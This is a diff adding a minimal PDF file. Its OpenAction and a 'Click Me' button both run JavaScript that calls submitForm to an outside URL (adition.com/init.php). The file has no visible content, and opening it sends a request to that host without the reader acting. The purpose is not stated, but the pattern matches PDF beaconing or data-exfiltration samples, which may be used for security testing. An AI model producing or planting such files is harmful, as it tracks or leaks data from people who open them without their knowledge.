@@ -1,0 +1,92 @@
+%PDF-1.4
+%цдья
+1 0 obj
+<<
+/Type /Catalog
+/Version /1.4
+/Pages 2 0 R
+/AcroForm 3 0 R
+/OpenAction 4 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [5 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/NeedAppearances true
+/Fields [6 0 R]
+>>
+endobj
+4 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS (function validate\(index\){ this.submitForm\('https://adition.com/init.php'\); } validate\(1\);)
+>>
+endobj
+5 0 obj
+<<
+/Type /Page
+/MediaBox [0.0 0.0 612.0 792.0]
+/Parent 2 0 R
+/Annots [6 0 R]
+>>
+endobj
+6 0 obj
+<<
+/FT /Btn
+/Ff 65536
+/Type /Annot
+/Subtype /Widget
+/AA 7 0 R
+/Rect [50.0 775.0 100.0 750.0]
+/T (ClickMe)
+/DA (/F0 6 Tf 0 g 1 1 1 rg )
+/MK 8 0 R
+>>
+endobj
+7 0 obj
+<<
+/U 9 0 R
+>>
+endobj
+8 0 obj
+<<
+/BC [0.5529412 0.7019608 0.8862745]
+/BG [0.5529412 0.7019608 0.8862745]
+/CA (Click Me)
+>>
+endobj
+9 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS (validate\(1\);)
+>>
+endobj
+xref
+0 10
+0000000000 65535 f
+0000000015 00000 n
+0000000112 00000 n
+0000000169 00000 n
+0000000228 00000 n
+0000000380 00000 n
+0000000475 00000 n
+0000000638 00000 n
+0000000668 00000 n
+0000000776 00000 n
+trailer
+<<
+/Root 1 0 R
+/ID [<2EB9AEC79934E92AB53D5BD3E77351EE> <2EB9AEC79934E92AB53D5BD3E77351EE>]
+/Size 10
+>>
+startxref
+847
+%%EOF
